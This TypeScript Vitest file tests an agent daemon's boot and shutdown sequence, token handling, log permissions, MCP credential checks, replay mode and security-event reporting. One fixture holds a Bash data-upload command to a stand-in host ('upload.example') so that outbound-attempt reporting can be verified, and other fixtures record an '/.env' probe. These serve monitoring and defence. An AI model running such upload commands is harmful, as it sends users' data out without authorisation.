import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  statSync,
  writeFileSync,
} from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import type { StimulusReceipt } from '@jungjaehoon/mama-core/runtime/runtime';
import type { TurnIntake } from '../../src/gateways/turn-contract.js';
import {
  bootDaemon,
  type DaemonGateway,
  type DaemonLogger,
} from '../../src/cli/commands/daemon.js';
import type { W1Config } from '../../src/runtime/config.js';
import type { OutboundAttemptEvent } from '../../src/api/security-events.js';
import { createOwnerRuntime } from '../../src/runtime/owner-runtime.js';
import { actionMcpSession } from '../helpers/action-mcp-session.js';
import {
  createSecurityEventRecorder,
  type SecurityEventOptions,
} from '../../src/api/security-events.js';

const roots: string[] = [];

beforeEach(() => {
  vi.stubEnv('MAMA_TELEGRAM_TOKEN', 'fixture-env-telegram');
});

afterEach(() => {
  vi.unstubAllEnvs();
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function config(root: string, backend: 'codex' | 'claude' = 'codex'): W1Config {
  return {
    version: 1,
    agent: {
      backend,
      model: 'fixture-model',
      effort: 'medium',
      max_turns: 20,
      timeout: 1_000,
      run_token_budget: 100,
      ...(backend === 'claude' ? { tools: { mcp_config: join(root, 'runtime', 'mcp.json') } } : {}),
    },
    jev: { keyFile: join(root, 'custom-replay-key'), vocabFile: join(root, 'vocab.json') },
    database: { path: join(root, 'memory.db') },
    logging: { level: 'info', file: join(root, 'daemon.log') },
    telegram: {
      enabled: true,
      owner_chat_id: 'chat',
      allowed_chats: ['chat'],
      owner_user_ids: ['owner'],
      polling: false,
    },
  };
}

function ownerDouble(order: string[]) {
  const intake: TurnIntake = {
    acceptOwnerMessage: vi.fn(() => ({ inputId: 'owner-input', state: 'accepted' })),
  };
  return {
    intake,
    surface: {
      dispatch: vi.fn(),
      ownerAccess: {},
    },
    acceptSourceDelta: vi.fn<(...args: never[]) => StimulusReceipt>(() => ({
      inputId: 'source-input',
      state: 'accepted',
    })),
    stop: vi.fn(async () => {
      order.push('owner:stop');
    }),
  };
}

function viewerDouble(order: string[]) {
  return {
    port: 3847,
    server: null,
    start: vi.fn(async () => {
      order.push('viewer:start');
    }),
    stop: vi.fn(async () => {
      order.push('viewer:stop');
    }),
  };
}

describe('daemon bootstrap', () => {
  it('exits loudly when Telegram reports fatal polling failure so launchd can restart', async () => {
    const root = mkdtempSync(join(tmpdir(), 'daemon-fatal-'));
    roots.push(root);
    const logs: string[] = [];
    const exit = vi.spyOn(process, 'exit').mockImplementation(() => undefined as never);
    let fatal: ((error: unknown) => void) | undefined;
    const daemon = await bootDaemon({
      config: config(root),
      home: root,
      configPath: join(root, 'config.yaml'),
      logger: { info: () => {}, error: (line) => logs.push(line) },
      dependencies: {
        ensureIsolation: () => {},
        createOwnerRuntime: async () => ownerDouble([]) as never,
        createViewerServer: () => viewerDouble([]) as never,
        startConnectorRuntime: async () => ({ stop: async () => {} }) as never,
        createTelegramGateway: (options) => {
          fatal = options.onFatalError;
          return { start: async () => {}, stop: async () => {} } as never;
        },
      },
    });
    try {
      fatal?.(new Error('polling fixture failed'));
      expect(exit).toHaveBeenCalledWith(1);
      expect(logs.join(' ')).toMatch(/telegram.*fatal.*polling fixture failed/);
    } finally {
      await daemon.stop();
      exit.mockRestore();
    }
  });

  it.each(['downloads', 'downloads/inner', '.'])(
    'refuses a workspace overlapping the daemon downloads directory (%s)',
    async (relativeWorkspace) => {
      const root = mkdtempSync(join(tmpdir(), 'daemon-overlap-'));
      roots.push(root);
      const options = config(root);
      options.agent.codex_cwd = join(root, relativeWorkspace);
      await expect(
        bootDaemon({
          config: options,
          home: root,
          configPath: join(root, 'config.yaml'),
          logger: { info: () => {}, error: () => {} },
          dependencies: { ensureIsolation: () => {} },
        })
      ).rejects.toThrow(/must not contain or sit inside/);
    }
  );

  it('refuses enabled Telegram without its environment token and never logs an injected config token', async () => {
    const root = mkdtempSync(join(tmpdir(), 'daemon-token-'));
    roots.push(root);
    vi.stubEnv('HOME', root);
    vi.stubEnv('MAMA_TELEGRAM_TOKEN', '');
    const options = config(root);
    Object.assign(options.telegram, { token: 'fixture-obsolete-token' });
    const logs: string[] = [];
    await expect(
      bootDaemon({
        config: options,
        home: root,
        configPath: join(root, 'config.yaml'),
        logger: { info: (line) => logs.push(line), error: (line) => logs.push(line) },
        dependencies: {
          ensureIsolation: () => {},
          createOwnerRuntime: async () => ownerDouble([]) as never,
          createViewerServer: () => viewerDouble([]) as never,
          startConnectorRuntime: async () => ({ stop: async () => {} }) as never,
        },
      })
    ).rejects.toThrow(/MAMA_TELEGRAM_TOKEN is required/);
    expect(logs.join('\n').includes('fixture-obsolete-token')).toBe(false);
  });

  it.each([false, true])(
    'restricts the daemon log before starting runtime %#',
    async (existing) => {
      const root = mkdtempSync(join(tmpdir(), 'daemon-log-'));
      roots.push(root);
      const options = config(root);
      options.logging.file = join(root, 'logs', 'daemon.log');
      if (existing) {
        mkdirSync(join(root, 'logs'));
        writeFileSync(options.logging.file, 'retained\n', { mode: 0o644 });
      }
      const daemon = await bootDaemon({
        config: options,
        home: root,
        configPath: join(root, 'config.yaml'),
        mode: 'replay',
        replay: async () => {},
        logger: { info: () => {}, error: () => {} },
        dependencies: {
          ensureIsolation: () => {},
          createOwnerRuntime: async () => {
            expect(existsSync(options.logging.file)).toBe(true);
            expect(statSync(options.logging.file).mode & 0o777).toBe(0o600);
            if (existing) expect(readFileSync(options.logging.file, 'utf8')).toBe('retained\n');
            return ownerDouble([]) as never;
          },
          createViewerServer: () => viewerDouble([]) as never,
        },
      });
      await daemon.stop();
    }
  );

  it('authenticates MCP list and action calls with the credential written by Claude boot', async () => {
    // Short paths keep the Unix socket below the platform path-length limit.
    const root = mkdtempSync(join(tmpdir(), 'mcp-boot-'));
    roots.push(root);
    vi.stubEnv('HOME', root);
    const daemon = await bootDaemon({
      home: root,
      configPath: join(root, 'config.yaml'),
      config: config(root, 'claude'),
      mode: 'replay',
      // Boot the owner runtime and action socket without collectors or Telegram.
      replay: async () => {},
      logger: { info: () => {}, error: () => {} },
      dependencies: {
        createOwnerRuntime: (options) =>
          createOwnerRuntime({
            ...options,
            embedder: { embed: async () => new Float32Array(1024).fill(0.25) },
            nativeSession: {
              stop: async () => {},
              callAction: (call, caller) =>
                daemon.owner.surface.hostToolCall(call.action, call.input, call.operationId!, {
                  session: { gatewayCallId: caller.tool_use_id },
                }),
            },
          }),
        createViewerServer: () => viewerDouble([]) as never,
      },
    });
    let mcp: ReturnType<typeof actionMcpSession> | undefined;
    try {
      const credential = readFileSync(daemon.paths.credentialPath, 'utf8').trim();
      expect(credential.length).toBeGreaterThan(0);
      expect(daemon.paths.credentialPath).toBe(join(root, 'runtime', 'session-credential'));
      expect(existsSync(join(root, 'session-credential'))).toBe(false);
      const registration = JSON.parse(readFileSync(daemon.paths.mcpConfigPath, 'utf8')) as {
        mcpServers: { mama: { env: { MAMA_HOME: string } } };
      };
      vi.stubEnv('MAMA_HOME', registration.mcpServers.mama.env.MAMA_HOME);
      mcp = actionMcpSession();
      const listed = await mcp.request('tools/list');
      expect(listed.error).toBeUndefined();
      expect((listed.result as { tools: Array<{ name: string }> }).tools).toEqual([
        expect.objectContaining({
          name: 'code_act',
          description: expect.stringContaining('\nwork.create — '),
        }),
      ]);
      const called = await mcp.request('tools/call', {
        name: 'work.create',
        arguments: {
          topic: 'fixture-work',
          summary: 'Fixture evidence',
          set: { title: 'Fixture work' },
          __mama_caller: { session_id: 'fixture-session', tool_use_id: 'fixture-call' },
        },
      });
      expect(called.error).toBeUndefined();
      const result = called.result as { isError?: boolean; content: Array<{ text: string }> };
      expect(result.isError).toBeUndefined();
      const payload = JSON.parse(result.content[0]!.text) as {
        success: boolean;
        data: { commitmentId: string };
      };
      expect(payload.success).toBe(true);
      const readBack = await daemon.owner.surface.hostToolCall(
        'work.show',
        {
          commitmentId: payload.data.commitmentId,
        },
        'fixture-readback'
      );
      expect(readBack.status).toBe('completed');
      expect(readBack.data).toMatchObject({
        items: [
          {
            commitmentId: payload.data.commitmentId,
            values: { title: 'Fixture work' },
          },
        ],
      });
      expect(JSON.stringify([listed, called]).includes(credential)).toBe(false);
    } finally {
      mcp?.close();
      await daemon.stop();
    }
  });

  it('starts producers after the owner runtime and keeps Telegram until owner results drain', async () => {
    const root = mkdtempSync(join(tmpdir(), 'mama-daemon-boot-'));
    roots.push(root);
    const mamaRoot = join(root, 'mama');
    const order: string[] = [];
    const logs: string[] = [];
    const logger: DaemonLogger = {
      info: (line) => logs.push(`info:${line}`),
      error: (line) => logs.push(`error:${line}`),
    };
    const memoryStats = { total: 7, thisWeek: 2 };
    const memoryRead = vi.fn(() => memoryStats);
    const owner = {
      ...ownerDouble(order),
      database: { adapter: { prepare: vi.fn(() => ({ get: memoryRead })) } },
    };
    const viewer = viewerDouble(order);
    let securityEvents: SecurityEventOptions | undefined;
    const connectors = {
      stop: vi.fn(async () => {
        order.push('connectors:stop');
      }),
    };
    const gateway: DaemonGateway = {
      start: vi.fn(async () => {
        order.push('telegram:start');
      }),
      stop: vi.fn(async () => {
        order.push('telegram:stop');
      }),
      deliverResponse: vi.fn(async () => {}),
      sendToOwner: vi.fn(async () => {}),
      sendFile: vi.fn(async () => ({ sentAs: 'document' as const, size: 0 })),
    };
    const daemon = await bootDaemon({
      home: root,
      configPath: join(mamaRoot, 'config.yaml'),
      config: config(mamaRoot),
      logger,
      dependencies: {
        createOwnerRuntime: vi.fn(async (options) => {
          expect(options.connectors).toContain('calendar');
          expect(options.replayKeyFile).toBe(join(mamaRoot, 'custom-replay-key'));
          expect(options.attachmentPorts?.downloadsDir).toBe(join(mamaRoot, 'downloads'));
          expect(statSync(join(mamaRoot, 'downloads')).mode & 0o777).toBe(0o700);
          order.push('owner:start');
          return owner as never;
        }),
        createViewerServer: vi.fn((options) => {
          securityEvents = options.securityEvents;
          expect(options.getMemoryStats?.()).toEqual(memoryStats);
          expect(owner.database.adapter.prepare).toHaveBeenCalledWith(
            expect.stringContaining('FROM decisions')
          );
          expect(memoryRead).toHaveBeenCalledWith(expect.any(Number), expect.any(Number));
          return viewer as never;
        }),
        startConnectorRuntime: vi.fn(async () => {
          order.push('connectors:start');
          return connectors as never;
        }),
        createTelegramGateway: vi.fn((options) => {
          expect(options.token === 'fixture-env-telegram').toBe(true);
          expect(options.config?.ownerChatId).toBe('chat');
          expect(options.filesRoot).toBe(join(mamaRoot, 'workspace', 'files'));
          expect(options.downloadsDir).toBe(join(mamaRoot, 'downloads'));
          return gateway;
        }),
      },
    });

    expect(order).toEqual(['owner:start', 'viewer:start', 'connectors:start', 'telegram:start']);
    expect(securityEvents?.path).toBe(join(mamaRoot, 'logs', 'security-events.jsonl'));
    expect(securityEvents?.replay).toBe(false);
    createSecurityEventRecorder(securityEvents).record({
      time: new Date().toISOString(),
      class: 'probe',
      method: 'GET',
      path: '/.env',
      status: 404,
      cfRay: null,
      identity: 'anonymous',
    });
    expect(gateway.sendToOwner).toHaveBeenCalledWith(
      expect.stringContaining('/.env'),
      expect.any(String)
    );
    expect(existsSync(join(mamaRoot, 'workspace', '.git', 'HEAD'))).toBe(true);
    expect(readFileSync(join(mamaRoot, 'workspace', '.git', 'HEAD'), 'utf8')).toBe(
      'ref: refs/heads/main\n'
    );

    await daemon.stop();
    await daemon.stop();

    expect(order).toEqual([
      'owner:start',
      'viewer:start',
      'connectors:start',
      'telegram:start',
      'connectors:stop',
      'viewer:stop',
      'owner:stop',
      'telegram:stop',
    ]);
    expect(logs.some((line) => line.includes('boot stage=owner_runtime'))).toBe(true);
    expect(logs.some((line) => line.includes('boot stage=connectors'))).toBe(true);
    expect(logs.some((line) => line.includes('boot stage=viewer'))).toBe(true);
    expect(logs.some((line) => line.includes('boot stage=telegram'))).toBe(true);
    expect(logs.filter((line) => line === 'info:owner policy: none')).toHaveLength(1);
  });

  it('logs a loaded owner policy once and passes its provider to the owner runtime', async () => {
    const root = mkdtempSync(join(tmpdir(), 'mama-daemon-owner-policy-'));
    roots.push(root);
    const mamaRoot = join(root, 'mama');
    mkdirSync(mamaRoot, { recursive: true });
    writeFileSync(join(mamaRoot, 'owner-policy.md'), 'owner policy fixture\n', 'utf8');
    const logs: string[] = [];
    const logger: DaemonLogger = {
      info: (line) => logs.push(`info:${line}`),
      error: (line) => logs.push(`error:${line}`),
    };
    const owner = ownerDouble([]);
    const viewer = viewerDouble([]);
    const gateway: DaemonGateway = {
      start: vi.fn(async () => {}),
      stop: vi.fn(async () => {}),
      deliverResponse: vi.fn(async () => {}),
      sendToOwner: vi.fn(async () => {}),
      sendFile: vi.fn(async () => ({ sentAs: 'document' as const, size: 0 })),
    };
    let policyContent: string | null | undefined;
    const daemon = await bootDaemon({
      home: root,
      configPath: join(mamaRoot, 'config.yaml'),
      config: config(mamaRoot),
      logger,
      dependencies: {
        createOwnerRuntime: vi.fn(async (options) => {
          policyContent = options.ownerPolicyProvider?.().content;
          return owner as never;
        }),
        createViewerServer: vi.fn(() => viewer as never),
        startConnectorRuntime: vi.fn(async () => ({ stop: vi.fn(async () => {}) }) as never),
        createTelegramGateway: vi.fn(() => gateway),
      },
    });

    expect(logs.filter((line) => line === 'info:owner policy: loaded')).toHaveLength(1);
    expect(policyContent).toBe('owner policy fixture\n');
    await daemon.stop();
  });

  it('sends an outbound attempt from the owner runtime to the security log and the owner', async () => {
    const root = mkdtempSync(join(tmpdir(), 'mama-daemon-outbound-'));
    roots.push(root);
    const mamaRoot = join(root, 'mama');
    mkdirSync(mamaRoot, { recursive: true });
    const gateway: DaemonGateway = {
      start: vi.fn(async () => {}),
      stop: vi.fn(async () => {}),
      deliverResponse: vi.fn(async () => {}),
      sendToOwner: vi.fn(async () => {}),
      sendFile: vi.fn(async () => ({ sentAs: 'document' as const, size: 0 })),
    };
    let report: ((event: OutboundAttemptEvent) => void) | undefined;
    const daemon = await bootDaemon({
      home: root,
      configPath: join(mamaRoot, 'config.yaml'),
      config: config(mamaRoot),
      logger: { info: () => {}, error: () => {} },
      dependencies: {
        createOwnerRuntime: vi.fn(async (options) => {
          report = options.outboundAttempts;
          return ownerDouble([]) as never;
        }),
        createViewerServer: vi.fn(() => viewerDouble([]) as never),
        startConnectorRuntime: vi.fn(async () => ({ stop: vi.fn(async () => {}) }) as never),
        createTelegramGateway: vi.fn(() => gateway),
      },
    });

    report?.({
      time: new Date().toISOString(),
      class: 'outbound_send',
      tool: 'Bash',
      summary: 'curl -X POST -d x https://upload.example/',
      sendsData: true,
      modelRunId: 'mr_daemon',
      callId: 'call-daemon',
    });
    await vi.waitFor(() =>
      expect(gateway.sendToOwner).toHaveBeenCalledWith(
        expect.stringContaining('Agent outbound attempt'),
        expect.stringMatching(/^agent-outbound:/)
      )
    );
    expect(readFileSync(join(mamaRoot, 'logs', 'security-events.jsonl'), 'utf8')).toContain(
      'mr_daemon'
    );
    await daemon.stop();
  });

  it('replay mode starts the owner and feeder without live connectors or Telegram', async () => {
    const root = mkdtempSync(join(tmpdir(), 'mama-daemon-replay-'));
    roots.push(root);
    const mamaRoot = join(root, 'mama');
    const owner = ownerDouble([]);
    const logs: string[] = [];
    const logger: DaemonLogger = {
      info: (line) => logs.push(`info:${line}`),
      error: (line) => logs.push(`error:${line}`),
    };
    // The read-only viewer serves the owner while the replay fills the records.
    const viewer = {
      port: 0,
      start: vi.fn(async () => undefined),
      stop: vi.fn(async () => undefined),
    };
    let securityEvents: SecurityEventOptions | undefined;
    const replay = vi.fn(async (context: { owner: unknown }) => {
      expect(context.owner).toBe(owner);
      expect(viewer.start).toHaveBeenCalledOnce();
    });
    const daemon = await bootDaemon({
      mode: 'replay',
      home: root,
      configPath: join(mamaRoot, 'config.yaml'),
      config: config(mamaRoot),
      logger,
      replay,
      dependencies: {
        createOwnerRuntime: vi.fn(async () => owner as never),
        createViewerServer: vi.fn((options) => {
          securityEvents = options.securityEvents;
          return viewer as never;
        }),
        startConnectorRuntime: vi.fn(async () => {
          throw new Error('live connectors must not start in replay mode');
        }),
        createTelegramGateway: vi.fn(() => {
          throw new Error('Telegram must not start in replay mode');
        }),
      },
    });

    expect(replay).toHaveBeenCalledOnce();
    expect(logs.filter((line) => line === 'info:replay collectors: disabled')).toHaveLength(1);
    expect(daemon.connectors).toBeNull();
    expect(daemon.gateway).toBeNull();
    expect(daemon.viewer).toBe(viewer);
    expect(securityEvents?.replay).toBe(true);
    const sendToOwner = vi.fn(async () => {});
    createSecurityEventRecorder({ ...securityEvents, sendToOwner }).record({
      time: new Date().toISOString(),
      class: 'probe',
      method: 'GET',
      path: '/.env',
      status: 404,
      cfRay: null,
      identity: 'anonymous',
    });
    expect(sendToOwner).not.toHaveBeenCalled();
    expect(existsSync(join(mamaRoot, 'logs', 'security-events.jsonl'))).toBe(true);
    await daemon.stop();
    expect(viewer.stop).toHaveBeenCalledOnce();
  });

  it('does not remove preserved W5 sources while creating Claude isolation files', async () => {
    const root = mkdtempSync(join(tmpdir(), 'mama-daemon-isolation-'));
    roots.push(root);
    const mamaRoot = join(root, 'mama');
    const preservedBrief = join(mamaRoot, 'briefs', 'keep.md');
    const preservedSkill = join(mamaRoot, '.codex', 'skills', 'keep.md');
    mkdirSync(join(mamaRoot, 'briefs'), { recursive: true });
    mkdirSync(join(mamaRoot, '.codex', 'skills'), { recursive: true });
    writeFileSync(preservedBrief, 'preserved', { encoding: 'utf8' });
    writeFileSync(preservedSkill, 'preserved', { encoding: 'utf8' });
    const order: string[] = [];
    const owner = ownerDouble(order);
    const viewer = viewerDouble(order);
    const gateway: DaemonGateway = {
      start: vi.fn(async () => {}),
      stop: vi.fn(async () => {}),
      deliverResponse: vi.fn(async () => {}),
      sendToOwner: vi.fn(async () => {}),
      sendFile: vi.fn(async () => ({ sentAs: 'document' as const, size: 0 })),
    };
    const daemon = await bootDaemon({
      home: root,
      configPath: join(mamaRoot, 'config.yaml'),
      config: config(mamaRoot, 'claude'),
      dependencies: {
        createOwnerRuntime: vi.fn(async () => owner as never),
        createViewerServer: vi.fn(() => viewer as never),
        startConnectorRuntime: vi.fn(async () => ({ stop: vi.fn(async () => {}) }) as never),
        createTelegramGateway: vi.fn(() => gateway),
      },
    });

    expect(existsSync(join(mamaRoot, 'workspace', '.git', 'HEAD'))).toBe(true);
    expect(existsSync(join(mamaRoot, '.empty-plugins'))).toBe(true);
    expect(existsSync(join(mamaRoot, 'runtime', 'mcp.json'))).toBe(true);
    // The native session is the sole settings writer; this owner factory is a test double.
    expect(existsSync(join(mamaRoot, 'workspace', '.claude', 'settings.json'))).toBe(false);
    expect(readFileSync(preservedBrief, 'utf8')).toBe('preserved');
    expect(readFileSync(preservedSkill, 'utf8')).toBe('preserved');

    await daemon.stop();
  });
});
